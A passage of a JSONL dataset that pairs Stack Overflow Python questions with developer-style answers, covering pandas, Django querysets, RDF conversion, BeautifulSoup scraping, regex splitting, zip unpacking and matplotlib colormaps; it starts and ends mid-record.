some other answers but couldn't make progress. Thanks in advance.<\/p>\n<p>Basant<\/p>","output_text":"<p>You need to update <code>query_set<\/code> not just call the function.<\/p>\n<pre><code>...\nif len(self.status) &gt; 0:\n    queryset = queryset.filter(status__in=self.status)\n\nqueryset = queryset.order_by('-created_on')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to count cells in a specific range with Pandas in python?<p>For example, I want to count the filled cells in the range C5 to C25 or D8 to D17. I can't use header names.<\/p>\n<p>How can I do that?<\/p>\n<p>dataxls = pd.read_excel('Racklist.xlsx', header=None)<\/p>","output_text":"<p>You can try:<\/p>\n<pre><code> dataxls = pd.read_excel(&quot;YOUR_FILE_NAME.xlsx&quot;, 'Sheet1',  usecols = &quot;C&quot;, header = 4, nrows=25)\n num_filled_cells = dataxls.shape[0] - dataxls.isnull().sum().values[0]\n print(num_filled_cells)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Converting a list of dictionaries, into rdf format<p>Goal:(Automation: When there is large list of dictionaries, i want to generate a spectic format  of data)\nthis is the input:<\/p>\n<pre><code>a = ['et2': 'OBJ Type',\n  'e2': 'OBJ',\n  'rel': 'rel',\n  'et1': 'SUJ Type',\n  'e1': 'SUJ'},\n     {'et2': 'OBJ Type 2',\n  'e2': 'OBJ',\n  'rel': 'rel',\n  'et1': 'SUJ Type',\n  'e1': 'SUJ'}\n  ]\n<\/code><\/pre>\n<p>The expected output is this :<\/p>\n<pre><code>:Sub a :SubType.\n:Sub :rel &quot;Obj&quot;.\n\n \n<\/code><\/pre>\n<p>This is what i have tried<\/p>\n<pre><code>Sub = 0\n\n\nfor i in a:\n    entity_type1 = i[&quot;EntityType1&quot;]\n    entity1 = i[&quot;Entity1&quot;]\n    entity_type2 = i[&quot;EntityType2&quot;]\n    entity2 = i[&quot;Entity2&quot;]\n    relation = i[&quot;Relation&quot;]\n    if 'Sub' in entity_type1 or entity_type2:\n        if entity1 == Sub and Sub &lt;= 0 :\n            \n            Sub +=1\n            sd_line1 = &quot;&quot;\n            sd_line2 = &quot;&quot;\n            sd_line1 = &quot;:&quot; + entity1 + &quot; a &quot; + &quot;:&quot; + entity_type1 + &quot;.&quot;\n            relation = &quot;:&quot;+relation\n            sd_line2 =&quot;\\n&quot;  &quot;:&quot; + entity1 + &quot; &quot; + relation + &quot; \\&quot;&quot; + entity2 + &quot;\\&quot;.&quot;\n            sd_line3 = sd_line1 + sd_line2\n            print(sd_line3)\n\n\n        \n      \n<\/code><\/pre>","output_text":"<p>A bit of advice: when doing such a transformation workflow, try to separate the major steps, e.g.: <em>loading<\/em> from a system, <em>parsing<\/em> data in one format, <em>extracting<\/em>, <em>transforming<\/em>, <em>serializing<\/em> to another format, <em>loading<\/em> to another system.<\/p>\n<p>In your code example, you are mixing the extraction, transformation and serialization steps. Separating those steps will make your code easier to read and, thus, easier to maintain or reuse.<\/p>\n<p>Below, I give you two solutions: the first is extracting data to a simple <code>dict<\/code>-based <code>subject-predicate-object<\/code> graph, the second one to a real RDF graph.<\/p>\n<p>In both cases, you'll see that I separated the extraction\/transformation steps (that returns a graph) and serialization steps (that uses the graph), making them more reusable:<\/p>\n<ul>\n<li><p>the <code>dict<\/code>-based transformation is implemented with a simple <code>dict<\/code> or with a <code>defaultdict<\/code>. The serialization step is common to both.<\/p>\n<\/li>\n<li><p>the <code>rdflib.Graph<\/code>-based transformation is common to two serializations: one to your format, the other one to any available <code>rdflib.Graph<\/code> serializations.<\/p>\n<\/li>\n<\/ul>\n<hr \/>\n<p>This will build a simple <code>dict<\/code>-based graph from your <code>a<\/code> dictionary:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>graph = {}\n\nfor e in a:\n    subj = e[&quot;Entity1&quot;]\n    graph[subj] = {}\n\n    # :Entity1 a :EntityType1.\n    obj = e[&quot;EntityType1&quot;]\n    graph[subj][&quot;a&quot;] = obj  \n\n    # :Entity1 :Relation &quot;Entity2&quot;.    \n    pred, obj = e[&quot;Relation&quot;], e[&quot;Entity2&quot;]\n    graph[subj][pred] = obj  \n\nprint(graph)\n<\/code><\/pre>\n<p>like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>{'X450-G2': {'a': 'switch',\n             'hasFeatures': 'Role-Based Policy',\n             'hasLocation': 'WallJack'},\n 'ers 3600': {'a': 'switch', \n              'hasFeatures': 'ExtremeXOS'},\n 'slx 9540': {'a': 'router',\n              'hasFeatures': 'ExtremeXOS',\n              'hasLocation': 'Chasis'}})\n<\/code><\/pre>\n<p>Or, in a shorter form, with a <code>defaultdict<\/code>:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from collections import defaultdict\n\ngraph = defaultdict(dict)\n\nfor e in a:\n    subj = e[&quot;Entity1&quot;]\n    \n    # :Entity1 a :EntityType1.\n    graph[subj][&quot;a&quot;] = e[&quot;EntityType1&quot;]  \n\n    # :Entity1 :Relation &quot;Entity2&quot;.    \n    graph[subj][e[&quot;Relation&quot;]] = e[&quot;Entity2&quot;]  \n\nprint(graph)\n<\/code><\/pre>\n<p>And this will print your <code>subject predicate object.<\/code> triples from the graph:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def normalize(text):\n    return text.replace(' ', '')\n\nfor subj, po in graph.items():\n    subj = normalize(subj)\n\n    # :Entity1 a :EntityType1.\n    print(':{} a :{}.'.format(subj, po.pop(&quot;a&quot;)))\n\n    for pred, obj in po.items():\n        # :Entity1 :Relation &quot;Entity2&quot;.    \n        print(':{} :{} &quot;{}&quot;.'.format(subj, pred, obj))\n\n    print()\n<\/code><\/pre>\n<p>like this:<\/p>\n<pre><code>:X450-G2 a :switch.\n:X450-G2 :hasFeatures &quot;Role-Based Policy&quot;.\n:X450-G2 :hasLocation &quot;WallJack&quot;.\n\n:ers3600 a :switch.\n:ers3600 :hasFeatures &quot;ExtremeXOS&quot;.\n\n:slx9540 a :router.\n:slx9540 :hasFeatures &quot;ExtremeXOS&quot;.\n:slx9540 :hasLocation &quot;Chasis&quot;.\n<\/code><\/pre>\n<hr \/>\n<p>This will build a real RDF graph using the <code>rdflib<\/code> library:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from rdflib import Graph, Literal, URIRef\nfrom rdflib.namespace import RDF\n\nA = RDF.type\ngraph = Graph()\n\nfor d in a:\n   subj = URIRef(normalize(d[&quot;Entity1&quot;]))\n\n    # :Entity1 a :EntityType1.\n    graph.add((\n        subj,\n        A, \n        URIRef(normalize(d[&quot;EntityType1&quot;]))\n    ))\n    \n    # :Entity1 :Relation &quot;Entity2&quot;.    \n    graph.add((\n        subj,\n        URIRef(normalize(d[&quot;Relation&quot;])), \n        Literal(d[&quot;Entity2&quot;])\n    ))\n<\/code><\/pre>\n<p>This:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>print(graph.serialize(format=&quot;n3&quot;).decode(&quot;utf-8&quot;))\n<\/code><\/pre>\n<p>will print the graph in the <code>N3<\/code> serialization format:<\/p>\n<pre><code>&lt;X450-G2&gt; a &lt;switch&gt; ;\n    &lt;hasFeatures&gt; &quot;Role-Based Policy&quot; ;\n    &lt;hasLocation&gt; &quot;WallJack&quot; .\n\n&lt;ers3600&gt; a &lt;switch&gt; ;\n    &lt;hasFeatures&gt; &quot;ExtremeXOS&quot; .\n\n&lt;slx9540&gt; a &lt;router&gt; ;\n    &lt;hasFeatures&gt; &quot;ExtremeXOS&quot; ;\n    &lt;hasLocation&gt; &quot;Chasis&quot; .\n<\/code><\/pre>\n<p>And this will query the graph to print it in your format:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for subj in set(graph.subjects()):\n    po = dict(graph.predicate_objects(subj))\n    \n    # :Entity1 a :EntityType1.\n    print(&quot;:{} a :{}.&quot;.format(subj, po.pop(A)))\n    \n    for pred, obj in po.items():\n        # :Entity1 :Relation &quot;Entity2&quot;.    \n        print(':{} :{} &quot;{}&quot;.'.format(subj, pred, obj))\n    print()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python, Pandas: Drop datframe columns and combine rows with condition<p>I got a dataframe similar to this:<\/p>\n<p><strong>Original<\/strong><\/p>\n<pre><code>#   |  col_a   |  col_b  |  ..\n1   |  100725  |  No     |  ..\n2   |  100726  |  Yes    |  ..\n3   |  100726  |  No     |  ..\n4   |  100726  |  No     |  ..\n5   |  100727  |  Yes    |  ..\n6   |  100728  |  No     |  ..\n7   |  100728  |  Yes    |  ..\n8   |  100728  |  Yes    |  ..\n9   |  100729  |  No     |  ..\n10  |  100729  |  No     |  ..\n<\/code><\/pre>\n<p><strong>Result<\/strong><\/p>\n<pre><code>#   |  col_a   |  col_b  |  ..\n1   |  100725  |  No     |  ..\n2   |  100726  |  Yes    |  ..\n5   |  100727  |  Yes    |  ..\n8   |  100728  |  Yes    |  ..\n9   |  100729  |  No     |  ..\n<\/code><\/pre>\n<p>What I'm trying to achieve: as shown above, I want to create a new dataframe with only unique numbers inside <em>col_a<\/em>, but with a twist: In <em>col_b<\/em> I want to receive a <em>Yes<\/em>, regardless if all or just one row contains this value. Only if there are only <em>No<\/em>-Values I want to receive a <em>No<\/em> in the final dataframe.<\/p>\n<p>Is there a clever way to achieve such a dataframe without creating a bunch of temporary columns for calculating.<\/p>\n<p>Thanks for your help and have a great day!<\/p>\n<p>finethen<\/p>","output_text":"<p>Sort <code>col_b<\/code> values ('Yes' first then 'No') then keep first occurrence of <code>col_b<\/code> and finally restore the index order:<\/p>\n<pre><code>&gt;&gt;&gt; df.sort_values('col_b', ascending=False).drop_duplicates('col_a').sort_index()\n\n    col_a col_b\n0  100725    No\n1  100726   Yes\n4  100727   Yes\n6  100728   Yes\n8  100729    No\n<\/code><\/pre>\n<p>Step by step:<\/p>\n<pre><code>&gt;&gt;&gt; df.sort_values('col_b', ascending=False)\n    col_a col_b\n1  100726   Yes\n4  100727   Yes\n6  100728   Yes\n7  100728   Yes\n0  100725    No\n2  100726    No\n3  100726    No\n5  100728    No\n8  100729    No\n9  100729    No\n\n&gt;&gt;&gt; df.sort_values('col_b', ascending=False).drop_duplicates('col_a')\n    col_a col_b\n1  100726   Yes\n4  100727   Yes\n6  100728   Yes\n0  100725    No\n8  100729    No\n\n&gt;&gt;&gt; df.sort_values('col_b', ascending=False).drop_duplicates('col_a').sort_index()\n    col_a col_b\n0  100725    No\n1  100726   Yes\n4  100727   Yes\n6  100728   Yes\n8  100729    No\n<\/code><\/pre>\n<p>Setup:<\/p>\n<pre><code>data = {'col_a': [100725, 100726, 100726, 100726, 100727,\n                  100728, 100728, 100728, 100729, 100729],\n        'col_b': ['No', 'Yes', 'No', 'No', 'Yes', 'No', 'Yes', 'Yes', 'No', 'No']}\ndf = pd.DataFrame(data)\nprint(df)\n\n# Output:\n    col_a col_b\n0  100725    No\n1  100726   Yes\n2  100726    No\n3  100726    No\n4  100727   Yes\n5  100728    No\n6  100728   Yes\n7  100728   Yes\n8  100729    No\n9  100729    No\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Formatting grabbed data from dropdwon boxes and adding data into the result in Python Beautifulsoup<p>I have the following code that partially runs but with a very messy result display. I need help on how to get the additional data as well formatting of the output.<\/p>\n<pre><code>from urllib.request import Request, urlopen\nfrom bs4 import BeautifulSoup\nimport re, random, ctypes\nimport requests, os\nfrom time import sleep\nimport beepy as beep\nfrom time import strftime\nimport datetime\n\nuser_agent_list = [\n&quot;header = {'User-Agent': 'Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0Gecko\/20100101 Firefox\/86.0'}&quot;,\n&quot;header = {'User-Agent': 'Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/83.0.4103.97 Safari\/537.36'}&quot;,\n&quot;header = {'User-Agent': 'Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.1.1 Safari\/605.1.15'}&quot;,\n&quot;header = {'User-Agent': 'Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/83.0.4103.97 Safari\/537.36'}&quot;,\n&quot;header = {'User-Agent': 'Mozilla\/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/32.0.1667.0 Safari\/537.36'}&quot;,\n&quot;header = {'User-Agent': 'Mozilla\/5.0 (Windows NT 6.1; WOW64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/36.0.1985.67 Safari\/537.36'}&quot;\n]\nheader = random.choice(user_agent_list)\n\nline = &quot;https:\/\/bscscan.com\/address\/0x639AD7c49EC616a64e074c21a58608C0d843A8a3&quot;\ncontractpage = requests.get(line,header)\nca = BeautifulSoup(contractpage.content, 'html.parser')\ncontractcreator = ca.find(id='ContentPlaceHolder1_trContract').get_text()\n\ntokenname = ca.find(id='ContentPlaceHolder1_tr_tokeninfo').get_text()\ntranscount = ca.find('p', class_='mr-2 mb-2').get_text()\ntokencount = ca.find(id='ContentPlaceHolder1_tokenbalance').get_text()\n\nprint (contractcreator)\nprint (&quot;Token Name: &quot;, tokenname)\nprint (&quot;Trans Count: &quot;, transcount)\nprint (&quot;Token Count: &quot;, tokencount)\n<\/code><\/pre>\n<p>Current Output: #-- very, very messy with some intended data missing<\/p>\n<pre><code>ContractCreator:\n0x7ab96edb99e1faa06238609947792038520f1a3c at txn 0x51a8db6ac707dcd9644b5400b533c9bbe95243054c9c67e8a8aeeab38c7f7e79\n\nToken Name:  \nTokenTracker:\n TripCandy (CANDY)\nTrans Count:  \n\u00a0Latest 25 from a total of 2,878 transactions\n\nToken Count:  \nToken:\n$726.10\n3\n\nCould not find any matches! Token display limit reached. Click to Show more\n\n BEP-20 Tokens (3)\u00a0\u00a0\u00a0\u00a0Minereum BSC (MNEB)150,000 MNEB\u00a0Neftipedia (NFT)1 NFT$0.01@0.0086TripCandy (CANDY)76,581.46551862 CANDY$726.09@0.0095\n<\/code><\/pre>\n<p>Wanted Output:   #-- current data extracted when I run the code<\/p>\n<pre><code>ContractCreator: 0x7ab96edb99e1faa06238609947792038520f1a3c\nTxn:             0x51a8db6ac707dcd9644b5400b533c9bbe95243054c9c67e8a8aeeab38c7f7e79\nToken Name:      TripCandy (CANDY)\nTrans Count:     2,875\nBalance:         0.498586644749540253 BNB #-- needed additional data\nTokens ValCount: $732.78 \/ 3              #-- needed additional data and formatting\nToken List:      BEP-20 Tokens (3)\u00a0\u00a0\u00a0\u00a0    #-- data from the dropdown box\n                 Minereum BSC (MNEB)150,000 MNEB\n                 Neftipedia (NFT)1                - $0.01 @ 0.0086\n                 TripCandy (CANDY)76,581.46551862 - $732.77 @ 0.0096\n<\/code><\/pre>","output_text":"<pre class=\"lang-py prettyprint-override\"><code>import requests\nfrom bs4 import BeautifulSoup\nfrom pprint import pp\n\nheaders = {\n    'User-Agent': 'Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko\/20100101 Firefox\/90.0'\n}\n\nadds = [\n    '0x639AD7c49EC616a64e074c21a58608C0d843A8a3'\n]\n\n\ndef main(url):\n    with requests.Session() as req:\n        req.headers.update(headers)\n        for add in adds:\n            r = req.get(url.format(add))\n            soup = BeautifulSoup(r.text, 'lxml')\n            goal = soup.select('div.card-body')\n            data = {\n                'ContractCreator': goal[1].select_one('a.hash-tag').text,\n                'Txn': goal[1].select('a.hash-tag')[1].text,\n                'Token Name': goal[1].select('a')[3].text,\n                'Trans Count': soup.select_one('p.mr-2 a').text,\n                'Balance': goal[0].select_one('.col-md-8').get_text(strip=True),\n                'Tokens ValCount': &quot; \/ &quot;.join(list(goal[0].select_one('.position-relative').stripped_strings)[:2]),\n                'Token List': [x.get_text(strip=True) for x in soup.select('.list.list-unstyled strong, .list-name')]\n            }\n            pp(data)\n\n\nmain('https:\/\/bscscan.com\/address\/{}')\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>{'ContractCreator': '0x7ab96edb99e1faa06238609947792038520f1a3c',\n 'Txn': '0x51a8db6ac707dcd9644b5400b533c9bbe95243054c9c67e8a8aeeab38c7f7e79',    \n 'Token Name': 'TripCandy (CANDY)',\n 'Trans Count': '2,880',\n 'Balance': '0.498586644749540253 BNB',\n 'Tokens ValCount': '$727.19 \/ 3',\n 'Token List': ['BEP-20 Tokens',\n                'Minereum BSC (MNEB)',\n                'Neftipedia (NFT)',\n                'TripCandy (CANDY)']}\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Having some issues with Python Exceptions in my script<p>I am trying to scrape data from a few websites for a proof of concept project. Currently using Python3 with BS4 to collect the data required. I have a dictionary of URLS from three sites. Each of the sites requires a different method to collect the data as their HTML is different. I have been using a &quot;Try, If, Else, stack but I keep running into issues, If you could have a look at my code and help me to fix it then that would be great!<\/p>\n<p>As I add more sites to be scraped I will not be able to use &quot;Try, If, Else&quot; to cycle through various methods to find the correct way to scrape the data, how can I future-proof this code to allow me to add as many websites and scrape data from various elements contained within in the future?<\/p>\n<pre><code># Scraping Script Here:\n\ndef job():\n\nprices = {\n\n    # LIVEPRICES\n\n    &quot;LIVEAUOZ&quot;:    {&quot;url&quot;: &quot;https:\/\/www.gold.co.uk\/&quot;,\n                           &quot;trader&quot;: &quot;Gold.co.uk&quot;,\n                           &quot;metal&quot;:  &quot;Gold&quot;,\n                           &quot;type&quot;:   &quot;LiveAUOz&quot;},\n\n\n    # GOLD\n\n    &quot;GLDAU_BRITANNIA&quot;:    {&quot;url&quot;: &quot;https:\/\/www.gold.co.uk\/gold-coins\/gold-britannia-coins\/britannia-one-ounce-gold-coin-2020\/&quot;,\n                           &quot;trader&quot;: &quot;Gold.co.uk&quot;,\n                           &quot;metal&quot;:  &quot;Gold&quot;,\n                           &quot;type&quot;:   &quot;Britannia&quot;},\n    &quot;GLDAU_PHILHARMONIC&quot;: {&quot;url&quot;: &quot;https:\/\/www.gold.co.uk\/gold-coins\/austrian-gold-philharmoinc-coins\/austrian-gold-philharmonic-coin\/&quot;,\n                           &quot;trader&quot;: &quot;Gold.co.uk&quot;,\n                           &quot;metal&quot;:  &quot;Gold&quot;,\n                           &quot;type&quot;:   &quot;Philharmonic&quot;},\n    &quot;GLDAU_MAPLE&quot;:        {&quot;url&quot;:    &quot;https:\/\/www.gold.co.uk\/gold-coins\/canadian-gold-maple-coins\/canadian-gold-maple-coin\/&quot;,\n                           &quot;trader&quot;: &quot;Gold.co.uk&quot;,\n                           &quot;metal&quot;:  &quot;Gold&quot;,\n                           &quot;type&quot;:   &quot;Maple&quot;},\n\n    # SILVER\n\n    &quot;GLDAG_BRITANNIA&quot;:    {&quot;url&quot;: &quot;https:\/\/www.gold.co.uk\/silver-coins\/silver-britannia-coins\/britannia-one-ounce-silver-coin-2020\/&quot;,\n                           &quot;trader&quot;: &quot;Gold.co.uk&quot;,\n                           &quot;metal&quot;:  &quot;Silver&quot;,\n                           &quot;type&quot;:   &quot;Britannia&quot;},\n    &quot;GLDAG_PHILHARMONIC&quot;: {&quot;url&quot;: &quot;https:\/\/www.gold.co.uk\/silver-coins\/austrian-silver-philharmonic-coins\/silver-philharmonic-2020\/&quot;,\n                           &quot;trader&quot;: &quot;Gold.co.uk&quot;,\n                           &quot;metal&quot;:  &quot;Silver&quot;,\n                           &quot;type&quot;:   &quot;Philharmonic&quot;}\n\n}\n\nresponse = requests.get(\n    'https:\/\/www.gold.co.uk\/silver-price\/')\nsoup = BeautifulSoup(response.text, 'html.parser')\nAG_GRAM_SPOT = soup.find(\n    'span', {'name': 'current_price_field'}).get_text()\n\n# Convert to float\nAG_GRAM_SPOT = float(re.sub(r&quot;[^0-9\\.]&quot;, &quot;&quot;, AG_GRAM_SPOT))\n# No need for another lookup\nAG_OUNCE_SPOT = AG_GRAM_SPOT * 31.1035\n\nfor coin in prices:\n    response = requests.get(prices[coin][&quot;url&quot;])\n    soup = BeautifulSoup(response.text, 'html.parser')\n\n    try:\n        text_price = soup.find(\n            'td', {'id': 'total-price-inc-vat-1'}).get_text()        &lt;-- Method 1\n\n    except:\n        text_price = soup.find(\n            'td', {'id': 'total-price-inc-vat-1'}).get_text()        &lt;-- Method 2\n\n    else:\n        text_price = soup.find(\n            'td', {'class': 'gold-price-per-ounce'}).get_text()      \n\n    # Grab the number\n    prices[coin][&quot;price&quot;] = float(re.sub(r&quot;[^0-9\\.]&quot;, &quot;&quot;, text_price))\n\n# ============================================================================\n\nroot = etree.Element(&quot;root&quot;)\n\nfor coin in prices:\n    coinx = etree.Element(&quot;coin&quot;)\n    etree.SubElement(coinx, &quot;trader&quot;, {\n                     'variable': coin}).text = prices[coin][&quot;trader&quot;]\n    etree.SubElement(coinx, &quot;metal&quot;).text = prices[coin][&quot;metal&quot;]\n    etree.SubElement(coinx, &quot;type&quot;).text = prices[coin][&quot;type&quot;]\n    etree.SubElement(coinx, &quot;price&quot;).text = (\n        &quot;\u00a3&quot;) + str(prices[coin][&quot;price&quot;])\n    root.append(coinx)\n\nfName = '.\/templates\/data.xml'\nwith open(fName, 'wb') as f:\n    f.write(etree.tostring(root, xml_declaration=True,\n                           encoding=&quot;utf-8&quot;, pretty_print=True))\n<\/code><\/pre>","output_text":"<p>Add a config for the scraping where each config is something like this:<\/p>\n<pre><code>prices = {\n    &quot;LIVEAUOZ&quot;: {\n        &quot;url&quot;: &quot;https:\/\/www.gold.co.uk\/&quot;,\n        &quot;trader&quot;: &quot;Gold.co.uk&quot;,\n        &quot;metal&quot;: &quot;Gold&quot;,\n        &quot;type&quot;: &quot;LiveAUOz&quot;,\n        &quot;price&quot;: {\n            &quot;selector&quot;: '#id &gt; div &gt; table &gt; tr',\n            &quot;parser&quot;: lambda x: float(re.sub(r&quot;[^0-9\\.]&quot;, &quot;&quot;, x))\n        }\n\n    }\n}\n<\/code><\/pre>\n<p>User the selector part of price to get the relevant part of HTML and then parse it with the parser function.<\/p>\n<p>e.g.<\/p>\n<pre><code>for key, config in prices.items():\n    response = requests.get(config['url'])\n    soup = BeautifulSoup(response.text, 'html.parser')\n    price_element = soup.find(config['price']['selector'])\n    if price_element:\n        AG_GRAM_SPOT = price_element.get_text()\n        # convert to float\n        AG_GRAM_SPOT = config['price']['parser'](AG_GRAM_SPOT)\n        # etc\n<\/code><\/pre>\n<p>You can modify the config object as you need but it will probably be very similar for most sites. For example, the text parsing could very well always be the same so instead of lambda function, create a function with def.<\/p>\n<pre><code>def textParser(text):\n    return float(re.sub(r&quot;[^0-9\\.]&quot;, &quot;&quot;, text))\n<\/code><\/pre>\n<p>Then add the reference to textParser in the config.<\/p>\n<pre><code>prices = {\n    &quot;LIVEAUOZ&quot;: {\n        &quot;url&quot;: &quot;https:\/\/www.gold.co.uk\/&quot;,\n        &quot;trader&quot;: &quot;Gold.co.uk&quot;,\n        &quot;metal&quot;: &quot;Gold&quot;,\n        &quot;type&quot;: &quot;LiveAUOz&quot;,\n        &quot;price&quot;: {\n            &quot;selector&quot;: '#id &gt; div &gt; table &gt; tr',\n            &quot;parser&quot;: textParser\n        }\n\n    }\n}\n<\/code><\/pre>\n<p>These steps will allow you to write generic code, saving all those try excepts.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why is Python re not splitting multiple instances of punctuation?<p>I am trying to split inputted text at spaces, and all special characters like punctuation, while keeping the delimiters. My re pattern works exactly the way I want except that it will not split multiple instances of the punctuation.\nHere is my re pattern <code>wordsWithPunc = re.split(r'([^-\\w]+)',words)<\/code><\/p>\n<p>If I have a word like &quot;hello&quot; with two punctuation marks after it then those punctuation marks are split but they remain as the same element. For example\n<code>&quot;hello,-&quot;<\/code> will equal <code>&quot;hello&quot;,&quot;,-&quot;<\/code> but I want it to be <code>&quot;hello&quot;,&quot;,&quot;,&quot;-&quot;<\/code><\/p>\n<p>Another example.<code> My name is mud!!!<\/code> would be split into <code>&quot;My&quot;,&quot;name&quot;,&quot;is&quot;,&quot;mud&quot;,&quot;!!!&quot;<\/code> but I want it to be <code>&quot;My&quot;,&quot;name&quot;,&quot;is&quot;,&quot;mud&quot;,&quot;!&quot;,&quot;!&quot;,&quot;!&quot;<\/code><\/p>","output_text":"<p>You need to make your pattern non-greedy (remove the <code>+<\/code>) if you want to capture single non-word characters, something like:<\/p>\n<pre><code>import re\n\nwords = 'My name is mud!!!'\nsplitted = re.split(r'([^-\\w])', words)\n# ['My', ' ', 'name', ' ', 'is', ' ', 'mud', '!', '', '!', '', '!', '']\n<\/code><\/pre>\n<p>This will produce also 'empty' matches between non-word characters (because you're slitting on each of them), but you can mitigate that by postprocessing the result to remove empty matches:<\/p>\n<pre><code>splitted = [match for match in re.split(r'([^-\\w])', words) if match]\n# ['My', ' ', 'name', ' ', 'is', ' ', 'mud', '!', '!', '!']\n<\/code><\/pre>\n<p>You can further strip spaces in the generator (i.e. <code>... if match.strip() ...<\/code>) if you want to get rid off the space matches as well.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Creating two 1D lists from python based on function returning two entries<p>I have a function <code>f(x,y)<\/code> which returns two values <code>a,b<\/code>.<\/p>\n<p>I want to construct a 2D List from returned values of <code>a,b<\/code> from <code>f<\/code> being called on <code>x<\/code> in a List of values and <code>y<\/code> in an equally long list of values.<\/p>\n<p>Is there an easy way to do this?<\/p>\n<p>I tried this and it did not work.<\/p>\n<pre><code>aList, bList = [f(x[i],y[i],1) for i in range(T)]\n<\/code><\/pre>","output_text":"<p>You can use the the <code>*-operator<\/code> to perform <a href=\"https:\/\/docs.python.org\/3\/tutorial\/controlflow.html?highlight=unpacking#unpacking-argument-lists\" rel=\"nofollow noreferrer\">argument unpacking of the list<\/a> while calling <a href=\"https:\/\/docs.python.org\/3\/library\/functions.html#zip\" rel=\"nofollow noreferrer\"><code>zip()<\/code><\/a> to compose the two desired lists.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>input_data = [(0, 0), (1, 1), (2, 2)]\n\ndef f(x, y):\n    return x+1, y-1\n\nresults = [f(i[0], i[1]) for i in input_data]\n\nprint (f&quot;results: {results}&quot;)\n\na_list, b_list = zip(*results)\n\nprint(f&quot;a_list: {a_list}\\nb_list: {b_list}&quot;)\n\n# This is equivalent to what the *-operator does above, in that\n# it is unpacking the list of tuples into a series of arguments\n# to zip().\na_list2, b_list2 = zip(results[0], results[1], results[2])\n\nprint(f&quot;a_list2: {a_list2}\\nb_list2: {b_list2}&quot;)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre class=\"lang-sh prettyprint-override\"><code>$ python3 solution.py\nresults: [(1, -1), (2, 0), (3, 1)]\na_list: (1, 2, 3)\nb_list: (-1, 0, 1)\na_list2: (1, 2, 3)\nb_list2: (-1, 0, 1)\n<\/code><\/pre>\n<p>Using the <code>*-operator<\/code> for unpacking is convenient because it can seamlessly scale with the number of arguments to <code>zip()<\/code>.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import random\n\ndef f(num_results):\n    return tuple(random.randint(1,10) for n in range(num_results))\n\nfor num_results in range(4,7):\n    print(f&quot;\\nHandling {num_results} values per tuple...&quot;)\n\n    results = [f(num_results) for _ in range(3)]\n    print(f&quot;results: {results}&quot;)\n    # Note the use unpacking in the assignment as well to \n    # capture a variable number of lists.\n    *x_lists, = zip(*results)\n    for *x_list, in x_lists:\n        print(x_list)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre class=\"lang-sh prettyprint-override\"><code>$ python3 solution2.py\n\nHandling 4 values per tuple...\nresults: [(4, 5, 7, 1), (8, 9, 9, 3), (6, 3, 9, 4)]\n[4, 8, 6]\n[5, 9, 3]\n[7, 9, 9]\n[1, 3, 4]\n\nHandling 5 values per tuple...\nresults: [(6, 3, 3, 9, 9), (10, 1, 1, 5, 4), (3, 10, 8, 3, 2)]\n[6, 10, 3]\n[3, 1, 10]\n[3, 1, 8]\n[9, 5, 3]\n[9, 4, 2]\n\nHandling 6 values per tuple...\nresults: [(5, 5, 10, 8, 1, 6), (7, 5, 8, 7, 9, 1), (5, 5, 1, 1, 10, 5)]\n[5, 7, 5]\n[5, 5, 5]\n[10, 8, 1]\n[8, 7, 1]\n[1, 9, 10]\n[6, 1, 5]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to interpolate colours to double its number in matplotlib<p>I have a list of 9 colors like this:<\/p>\n<pre><code>  colors = [\n           [0, 82, 246, 255],\n           [0, 196, 196, 255],\n           [0, 137, 83, 255],\n           [1, 233, 11, 255],\n           [234, 255, 31, 255],\n           [255, 176, 0, 255],\n           [247, 19, 0, 255],\n           [193, 0, 76, 255],\n           [255, 0, 255, 255]]\n<\/code><\/pre>\n<p>I want to use matplotlib to double the number of colours with interpolated ones. I have used <code>LinearSegmentedColormap.from_list<\/code> without success:<\/p>\n<pre><code>  cm = LinearSegmentedColormap.from_list('test', np.array(colors) \/ 255, \n                                         N=len(colors))\n  \n  colors = cm(np.linspace(0, 1, 2 * len(colors)))\n  colors = (colors * 255).astype('uint8')\n<\/code><\/pre>\n<p>However I get the same colours but 